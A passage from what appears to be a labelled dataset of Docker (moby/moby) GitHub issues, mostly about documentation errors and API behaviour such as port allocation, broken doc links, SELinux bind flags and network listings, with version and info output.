`/proc/sys/net/ipv4/ip_local_port_range`.\r\n\r\nHowever, the observed behaviour is, instead, that ports are allocated sequentially from the bottom of `ip_local_port_range`, with the sequence being reset whenever `dockerd` is restarted.\r\n\r\nMost definitions of \"random\" I can find mention \"unpredictability\", \"governed by or depending on chance\", or \"in no particular order\" as being defining characteristics; \"start from X and work your way up one by one\" doesn't meet any definition of \"random\" I can find.\r\n\r\n**Steps to reproduce the issue:**\r\n\r\n1. Restart `dockerd`, just to get a clean slate.\r\n2. Run `docker run --rm -it --expose 4242 -P alpine sh`\r\n3. Run `docker ps` in another shell, and note the host port number assigned to the container.  It will almost certainly be the first value in `/proc/sys/net/ipv4/ip_local_port_range`.\r\n4. Exit out of that container.\r\n5. Repeat steps 2-4 another dozen times or so.  Note each time that the host port number is almost certainly the next value above the previous one (with a small chance that another process on the machine might have temporarily snaffled a port in the middle).  Continue to repeat until the experiment has sufficient statistical power to convince you this isn't just the cruel hand of random chance toying with your sanity.\r\n6. Restart `dockerd` again.\r\n7. Run `docker run --rm -it --expose 4242 -P alpine sh`\r\n8. Run `docker ps` is another shell, note that the host port has probably gone back to the first value in `/proc/sys/net/ipv4/ip_local_port_range` (or is pretty close to it).\r\n\r\n**Describe the results you received:**\r\n\r\nIncluded above.\r\n\r\n**Describe the results you expected:**\r\n\r\nThe host ports allocated should not be allocated sequentially when multiple containers with `-P` are run.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\nThe chances of getting the first port in `ip_local_port_range` on my system are about 1 in 28,000.  The chances of getting the next sequential port each time over 10 runs, if my arithmetic is correct, is 1 in 15,992,496,204,377,989,289,565,234,114,532,246,053,888,000.  I don't think I'm that lucky.\r\n\r\nOn the up side, at least dockerd doesn't reuse recently released ports, like it does with container IP addresses, and it doesn't blindly re-use allocated ports after restart.  So the problem isn't as horrible as it *could* be.  But it's still not great.\r\n\r\nIdeally, the relevant code would be fixed to allocate ports randomly, in line with the documentation, but if not, the documentation should be updated to accurately describe the port allocation process.\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.06.0-ce\r\n API version:  1.30\r\n Go version:   go1.8.3\r\n Git commit:   02c1d87\r\n Built:        Fri Jun 23 21:17:22 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.06.0-ce\r\n API version:  1.30 (minimum version 1.12)\r\n Go version:   go1.8.3\r\n Git commit:   02c1d87\r\n Built:        Fri Jun 23 21:16:12 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 2\r\n Running: 2\r\n Paused: 0\r\n Stopped: 0\r\nImages: 392\r\nServer Version: 17.06.0-ce\r\nStorage Driver: overlay\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins: \r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: cfb82a876ecc11b5ca0977d1733adbe58599088a\r\nrunc version: 2d41c047c83e09a6d61d464906feb2a2f3c52aa4\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.9.0-3-amd64\r\nOperating System: Debian GNU/Linux 9 (stretch)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 8\r\nTotal Memory: 62.36GiB\r\nName: lolzno\r\nID: XCA5:PLPV:KBPE:SY63:O254:RZ3S:4UQS:C73M:KYHC:ASCI:25HL:GOQP\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nUsername: lolzno\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: true\r\n\r\nWARNING: No swap limit support\r\n```\r\n"},{"labels":["documentation"],"text":"There is a giant link at the top of the README:\r\n\r\n> Docker users, see [Moby and Docker](https://mobyproject.org/#moby-and-docker) to clarify the relationship between the projects\r\n\r\nThe link has a target, `#moby-and-docker`, but that seems to be broken. The landing page doesn't *really* clarify what the differences are, perhaps Moby is some base library to Docker? (But then what is `libcontainerd`? More abstraction?)"},{"labels":[null,"documentation"],"text":"Docker API documentation needs to be updated.\r\n\r\nThe `/plugins` endpoint returns the following response: https://github.com/moby/moby/blob/0ac25dfc751fa4304ab45afd5cd8705c2235d101/api/types/plugin_responses.go#L1\r\n\r\nBased on https://github.com/moby/moby/blob/0ac25dfc751fa4304ab45afd5cd8705c2235d101/api/types/plugin.go#L8-L31\r\n\r\nThe plugin object is quite different from the one documented in the 200 response sample at https://docs.docker.com/engine/api/v1.30/#operation/PluginList\r\n"},{"labels":["documentation",null,null],"text":"**Description**\r\n\r\nThe link of the \"docker run\" clean up command is not correct. The link is \"https://docs.docker.com/engine/reference/run/#clean-up---rm\" and should be \"https://docs.docker.com/engine/reference/run/#clean-up--rm\".\r\n\r\n**Steps to reproduce the issue:**\r\n1. Go to https://docs.docker.com/engine/reference/run/\r\n2. Click the link\r\n3. It doesn't work\r\n4. Check https://docs.docker.com/engine/reference/run/#clean-up--rm\r\n\r\n**Describe the results you received:**\r\nThe link doesn't work\r\n\r\n**Describe the results you expected:**\r\nThe link should work\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\nI notice that if I change the markdown code to have only one \"-\", the link of the markdown is broken.\r\n\r\n**Output of `docker version`:**\r\nIt is the online documentation of 17.06\r\n\r\n**Output of `docker info`:**\r\nIt is the online documentation of 17.06\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nNone"},{"labels":[null,"documentation",null,null],"text":"At the moment, the Dockerfile reference states the following:\r\n\r\n> A Dockerfile must start with a `FROM` instruction.\r\n\r\nHowever, this has since been changed because:\r\n\r\n> FROM instructions support variables that are declared by any ARG instructions that occur before the first FROM.\r\n\r\nThe `docs/reference/builder.md` file should be updated to reflect this change."},{"labels":[null,"documentation",null,null,null],"text":"I've got 2 use cases which stopped working with the latest version of docker. But unfortunately I can't say with which version it started.\r\n\r\nUse Case 1:\r\nI generate a config file for an asp.net page with a custom console application. Therefore I have the key/values for the config file in the parameter:\r\n```\r\nRUN C:\\\\deployment\\\\tool.exe -value \"ConnectionString=\\\"Server=localhost;Database=Test;User Id=sa;Password=password\\\";Title=\\\"Test\\\"\" -dir C:\\inetpub\\wwwroot\\Test\r\n```\r\n\r\nUse Case 2:\r\nI generate also a json file with the tool. Also here I pass the json content as parameter:\r\n```\r\nRUN C:\\\\deployment\\\\tool.exe -value \"{\\\"\"Title\\\"\":\\\"\"Unknown\\\"\",\\\"\"Packages\\\"\":[{\\\"\"Id\\\"\":\\\"\"Test\\\"\",\\\"\"Version\\\"\":\\\"\"*\\\"\",\\\"\"Configuration\\\"\":\\\"\"Release\\\"\"}]}\" -dir C:\\inetpub\\wwwroot\\Test\r\n```\r\n\r\nBoth cases generate now powershell errors. I can't find a way to get it working again."},{"labels":[null,"documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\nOn querying images list each image list will be having `Containers` property with value -1 regardless of amount of containers using this image.\r\n\r\n**Steps to reproduce the issue:**\r\n1. Run container from the image(for example `docker run -ti ubuntu bash`)\r\n2. Get list of images from the API(`curl --unix-socket /var/run/docker.sock \"http:/v1.30/images/json\"`)\r\n\r\n**Describe the results you received:**\r\n\r\n\"ubuntu\" image has `Containers` property with value -1.\r\n\r\n**Describe the results you expected:**\r\n\r\n`Containers` property with value 1\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.06.0-ce\r\n API version:  1.30\r\n Go version:   go1.8.3\r\n Git commit:   02c1d87\r\n Built:        Fri Jun 23 21:31:53 2017\r\n OS/Arch:      darwin/amd64\r\n\r\nServer:\r\n Version:      17.06.0-ce\r\n API version:  1.30 (minimum version 1.12)\r\n Go version:   go1.8.3\r\n Git commit:   02c1d87\r\n Built:        Fri Jun 23 21:51:55 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: true\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 4\r\n Running: 2\r\n Paused: 0\r\n Stopped: 2\r\nImages: 40\r\nServer Version: 17.06.0-ce\r\nStorage Driver: overlay2\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\n Native Overlay Diff: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host ipvlan macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: cfb82a876ecc11b5ca0977d1733adbe58599088a\r\nrunc version: 2d41c047c83e09a6d61d464906feb2a2f3c52aa4\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.9.31-moby\r\nOperating System: Alpine Linux v3.5\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 1.952GiB\r\nName: moby\r\nID: QN2D:44BC:EQ5U:GCN2:Z2XT:DSNU:GGTI:FNKB:MHAJ:3I7E:ASHB:RJTT\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): true\r\n File Descriptors: 34\r\n Goroutines: 48\r\n System Time: 2017-07-07T10:18:20.598658487Z\r\n EventsListeners: 1\r\nNo Proxy: *.local, 169.254/16\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: true\r\nInsecure Registries:\r\n jenkin-registry.gsintlab.com\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n"},{"labels":["documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\nSince docker `17.06.0-ce` have been released. How to upgrade swarm mode cluster' docker engine? Upgrade starting from worker or manager? And how to ensure the cluster `raft` store state."},{"labels":[null,"documentation"],"text":"**Description**\r\n\r\nLooking at the [Docker Engine API docs](https://docs.docker.com/engine/api/v1.26/#operation/ContainerCreate) (scroll down and expand HostConfig, then scroll down to find the Binds documentation), I don't see anything related to the SELinux Context, which is mentioned in the docker documentation [here](https://docs.docker.com/engine/tutorials/dockervolumes/#volume-labels).\r\n\r\nHowever, it seems that the `:Z` or `:z` which are SELinux flags are accepted as I'm able to pass them (See reproduction of the issue).\r\n\r\n\r\n**Steps to reproduce the issue:**\r\n\r\nIf you have vagrant : \r\n1. create a `Vagrantfile` containing \r\n\r\n```\r\n# -*- mode: ruby -*-\r\n# vi: set ft=ruby :\r\n\r\nVagrant.configure(\"2\") do |config|\r\n  config.vm.box = \"fedora/25-cloud-base\"\r\n\r\n  config.vm.provision \"shell\", inline: <<-SHELL\r\n    set -eux\r\n\r\n    # prepare the system and install dependencies\r\n    dnf install -q -y docker\r\n    systemctl start docker\r\n    docker pull alpine:latest\r\n    \r\n    # Sanity check, to make sure unwanted argument do not pass\r\n    curl -s --unix-socket /var/run/docker.sock -H \"Content-Type: application/json\" \\\r\n    -d '{\"Image\": \"alpine\", \"Binds\": [\"/vagrant/Vagrantfile:/Vagrantfile:a\"]}' \\\r\n    -X POST http:/v1.24/containers/create\r\n\r\n    curl -s --unix-socket /var/run/docker.sock -H \"Content-Type: application/json\" \\\r\n    -d '{\"Image\": \"alpine\", \"Binds\": [\"/vagrant/Vagrantfile:/Vagrantfile:Z\"]}' \\\r\n    -X POST http:/v1.24/containers/create\r\n  SHELL\r\nend\r\n```\r\n2. run `vagrant up` in the same directory\r\n\r\nIf you don't use vagrant, make sure you have docker installed and run the two curl commands manually.\r\n\r\n**Describe the results you received:**\r\n\r\nThe first curl command failed which is normal, the api shouldn't accept invalid specifications, but the second succeeds, which is also normal as it is SELinux related. However, it is not specified in the documentation.\r\n\r\nI will work on a fix in the documentation as soon as possible. However, I have a question about it, should we add a link to the [documentation](https://docs.docker.com/engine/tutorials/dockervolumes/#volume-labels) for reference or should we just specify more examples ?\r\n\r\nThank you."},{"labels":["documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\nThe `docker stack ps --filter` option should be \"desired-state\" and not \"desired-stat\" as in documentation.\r\nhttps://docs.docker.com/engine/reference/commandline/stack_ps/#extended-description\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n1.Create a Swarm mode\r\n2.Create a Stack\r\n3.List stack containers with `docker stack ps --filter desired-stat=running`\r\n\r\n`desired-stat` is not a filter\r\n\r\n\r\nA list of running containers in the stack.\r\n\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\nA documentation bug. \r\n\r\nDocker 17.03\r\n\r\n\r\n\r\n**Output of `docker info`:**\r\n\r\nNot relevant as the bug is in the documentation. \r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nDocker for AWS Stable used to create Swarm.\r\n"},{"labels":["documentation"],"text":"From the release notes of v17.06.0-ce-rc2\r\n\r\n> Placement now also take platform in account moby/moby#33144\r\n\r\nWhile the PR that introduced the feature also updated the API docs, it didn't update the [user docs for service create](https://github.com/moby/moby/blob/master/docs/reference/commandline/service_create.md#specify-service-constraints---constraint), that also mention the placement constraints.\r\n\r\nI also noticed that the documentation here https://github.com/docker/swarmkit/#features talks about placement constrains, and mentions `node.ip` as another supported constraint. I'm not sure this made it to 17.06 yet, but if it did, we also need to update the user docs page with that.\r\n\r\n/ping @nishanttotla since he was the one who introduced #33144\r\nand @mstanleyjones for visibility\r\n\r\n---\r\n\r\nIf you're triaging this issue and are thinking if this issue should be filed against docker/docker.github.io instead, keep in mind that docker/docker.github.io will fetches https://github.com/moby/moby/blob/master/docs/reference/ to build the user-facing docs, so this issue needs to be addressed on this repo."},{"labels":[null,"documentation"],"text":"As seen there: https://github.com/moby/moby/blob/df4ca50805baa1d1488d811e82125f607c8daa09/integration-cli/docker_api_swarm_service_test.go#L63,\r\nthere is an `insertDefaults` query parameter not stated in the docs."},{"labels":["documentation"],"text":"The API docs reference ServiceSpec in the Secret definition:\r\n```\r\nSecret{\r\nID:\tstring\r\nVersion:\tObjectVersion{...}\r\nCreatedAt:\tstring ($dateTime)\r\nUpdatedAt:\tstring ($dateTime)\r\nSpec:\tServiceSpec{...}\r\n}\r\n```"},{"labels":["documentation"],"text":"**Description**\r\n\r\nDocker and Docker-Compose documentations do not make clear what are the valid values of ulimit options for Docker.\r\n\r\n**Steps to reproduce the issue:**\r\n1. Read Docker documentation\r\n2. Struggle to find correct option names. \r\n\r\n\r\n**Describe the results you received:**\r\n\r\nGoogle finds just a few places where possible options are listed - https://docs.aws.amazon.com/AmazonECS/latest/APIReference/API_Ulimit.html \r\nLooking on code - turns out it is incomplete and [any valid `setrlimit` option](https://linux.die.net/man/2/setrlimit) can be passed into `ulimits`\r\n\r\n**Describe the results you expected:**\r\n\r\nList of possible options or reference to example (setting list of file descriptiors, max memory, max cpu usage, etc)"},{"labels":["documentation",null],"text":"**Description**\r\n\r\nin `moby/container/state.go` we have a struct that handles containers state, it looks like this : \r\n``` go\r\ntype State struct {\r\n\tsync.Mutex\r\n\t// FIXME: Why do we have both paused and running if a\r\n\t// container cannot be paused and running at the same time?\r\n\tRunning           bool\r\n\tPaused            bool\r\n\tRestarting        bool\r\n\tOOMKilled         bool\r\n\tRemovalInProgress bool // Not need for this to be persistent on disk.\r\n\tDead              bool\r\n\tPid               int\r\n\tExitCodeValue     int    `json:\"ExitCode\"`\r\n\tErrorMsg          string `json:\"Error\"` // contains last known error when starting the container\r\n\tStartedAt         time.Time\r\n\tFinishedAt        time.Time\r\n\tHealth            *Health\r\n\r\n\twaitStop   chan struct{}\r\n\twaitRemove chan struct{}\r\n}\r\n```\r\nthis is a bit misleading as we need to always update the two bools in order to avoid any inconsistant behaviour.\r\nthe state is embed in : \r\n```go\r\ntype CommonContainer struct {\r\n\tStreamConfig *stream.Config\r\n\t// embed for Container to support states directly.\r\n\t*State          `json:\"State\"` // Needed for Engine API version <= 1.11\r\n          .....\r\n     }\r\n```\r\nas states the comments to ensure compatibility with versions <= 1.11, i think we can refactor without breaking much of it."},{"labels":[null,"documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\nThe current `swagger.yaml` file on the master branch, when rendered, causes some fields to not render, and the page then hangs.\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n1. `make swagger-docs`\r\n2. Go to `localhost:9000` in your browser\r\n3. Go to `/services/create`, click on `TaskTemplate`\r\n4. Try clicking anywhere else on the page\r\n\r\n**Describe the results you received:**\r\nThe page hangs\r\n\r\n**Describe the results you expected:**\r\nThe page shouldn't hang, and it should be possible to continue viewing fields."},{"labels":[null,"documentation"],"text":"feature added in https://github.com/moby/moby/pull/32496"},{"labels":[null,"documentation"],"text":"### Documentation Problem Description\r\n\r\nPer @gdevillele , the API reference topic [Delete unused volumes](https://docs.docker.com/engine/api/v1.28/#operation/VolumePrune) mentions a `filters` query parameter, but doesn’t mention any supported argument (because there isn’t any). This doesn’t make sense, we should not mention this “filters” parameter.\r\n\r\n### Where Found\r\n\r\n[Delete unused volumes](https://docs.docker.com/engine/api/v1.28/#operation/VolumePrune) in the API reference docs. \r\n\r\n### About the docs\r\n\r\nCurrently, the  API docs source lives here in the `moby/moby` codebase, not in the docs repository https://github.com/docker/docker.github.io. \r\n\r\n@thaJeztah need guidance on how we will deal with the relationship between `moby/moby` and the docs repository going forward. I don't have permissions to assign issues, but I suggest assigning to @mstanleyjones ?\r\n\r\n### Reviewers\r\n\r\n@gdevillele @johndmulhausen @thaJeztah \r\n\r\n"},{"labels":[null,"documentation",null,null],"text":"Hello,\r\n\r\ni have an error using this page (click into \"Labels\" menù):\r\n\r\nhttps://docs.docker.com/engine/api/v1.28/#operation/ServiceCreate\r\n\r\nJS Console stacktrace:\r\n\r\nError: Can't load component schema at /paths/~1services~1create/post/parameters/0/schema/properties/Labels\r\n    at d (redoc.1.11.0.min.js:43)\r\n    at e.init (redoc.1.11.0.min.js:17)\r\n    at e.t.preinit (redoc.1.11.0.min.js:9)\r\n    at e.preinit (redoc.1.11.0.min.js:9)\r\n    at e.ngOnInit (redoc.1.11.0.min.js:17)\r\n    at t.ngDoCheck (redoc.1.11.0.min.js:15)\r\n    at e.detectChangesInternal (redoc.1.11.0.min.js:15)\r\n    at e.t.detectChanges (redoc.1.11.0.min.js:7)\r\n    at t.detectChangesInNestedViews (redoc.1.11.0.min.js:7)\r\n    at e.detectChangesInternal (redoc.1.11.0.min.js:16)\r\n    at e.t.detectChanges (redoc.1.11.0.min.js:7)\r\n    at t.detectChangesInNestedViews (redoc.1.11.0.min.js:7)\r\n    at e.detectChangesInternal (redoc.1.11.0.min.js:16)\r\n    at e.t.detectChanges (redoc.1.11.0.min.js:7)\r\n    at t.detectChangesInNestedViews (redoc.1.11.0.min.js:7)"},{"labels":[null,"documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\nThe http endpoint `GET /networks` always returns an empty containers list. If requesting a single network, with `GET /networks/<network>` the containers are shown. \r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n1. Run `curl --unix-socket /var/run/docker.sock http:/v1.28/networks`\r\n\r\n**Describe the results you received:**\r\nReturns the following output: https://gist.github.com/Grisu118/1a15ea9a2abb6b04f45eb911a2f1c7f7#file-networks-json\r\n\r\n**Describe the results you expected:**\r\nI expect the output contains a container list like the /networks/development request:\r\nhttps://gist.github.com/Grisu118/1a15ea9a2abb6b04f45eb911a2f1c7f7#file-networks_development-json\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\nWorked in 13.x (don't know the exact version which was running before reboot)\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.04.0-ce\r\n API version:  1.28\r\n Go version:   go1.7.3\r\n Git commit:   4845c56\r\n Built:        Wed Apr 12 22:57:26 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.04.0-ce\r\n API version:  1.28 (minimum version 1.12)\r\n Go version:   go1.7.3\r\n Git commit:   4845c56\r\n Built:        Wed Apr 12 22:57:26 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 28\r\n Running: 25\r\n Paused: 0\r\n Stopped: 3\r\nImages: 37\r\nServer Version: 17.04.0-ce\r\nStorage Driver: overlay\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary:\r\ncontainerd version: 422e31ce907fd9c3833a38d7b8fdd023e5a76e73\r\nrunc version: 9c2d8d184e5da67c95d601382adf14862e4f2228\r\ninit version: N/A (expected: 949e6facb77383876aeff8a6944dde66b3089574)\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.10.9-coreos\r\nOperating System: Container Linux by CoreOS 1381.0.0 (Ladybug)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 4\r\nTotal Memory: 15.68GiB\r\nName: test01\r\nID: NDXW:B2RO:4U2N:CQRG:P7QK:DT53:DNTE:GH3A:N7IZ:2MSK:HHXC:MRTU\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n\r\nWARNING: bridge-nf-call-iptables is disabled\r\nWARNING: bridge-nf-call-ip6tables is disabled\r\n```\r\n"},{"labels":["documentation",null,null],"text":"**Steps to reproduce the issue:**\r\n1. Create next Dockerfile in \"test\" directory:\r\n\r\n   FROM debian\r\n   CMD echo \"test\"\r\n\r\n2. Go to \"test\" directory and execute next command (build image): \"docker build -t test:latest .\"\r\n3. Create docker stack file with name \"docker-cloud.yml\":\r\n\r\n   version: \"3\"\r\n   services:\r\n    test:\r\n       image: test:latest\r\n\r\n4. Execute next command: \"docker stack deploy -c docker-cloud.yml services\"\r\n5. Wait several seconds and execute \"docker ps -a\".\r\n\r\n**Expected**:\r\nOne exited container \"test:latest\" because default restart option value is \"no\" according [documentation](https://docs.docker.com/docker-cloud/apps/stack-yaml-reference/#restart).\r\n\r\n**Actual**:\r\nSeveral exited containers with \"test:latest\" tag.\r\n\r\n**Docker version**:\r\nClient:\r\n Version:      17.03.0-ce\r\n API version:  1.26\r\n Go version:   go1.7.5\r\n Git commit:   60ccb22\r\n Built:        Thu Feb 23 10:54:03 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.03.0-ce\r\n API version:  1.26 (minimum version 1.12)\r\n Go version:   go1.7.5\r\n Git commit:   60ccb22\r\n Built:        Thu Feb 23 10:54:03 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false`\r\n\r\n**Docker info**:\r\nContainers: 5\r\n Running: 5\r\n Paused: 0\r\n Stopped: 0\r\nImages: 16\r\nServer Version: 17.03.0-ce\r\nStorage Driver: overlay\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\nSwarm: active\r\n NodeID: 06qm3mlo2dtnnrt0lebbfqkiz\r\n Is Manager: true\r\n ClusterID: yonkvlxzljjjztpxzcuc3fnrn\r\n Managers: 1\r\n Nodes: 1\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Number of Old Snapshots to Retain: 0\r\n  Heartbeat Tick: 1\r\n  Election Tick: 3\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n Node Address: ...\r\n Manager Addresses:\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: 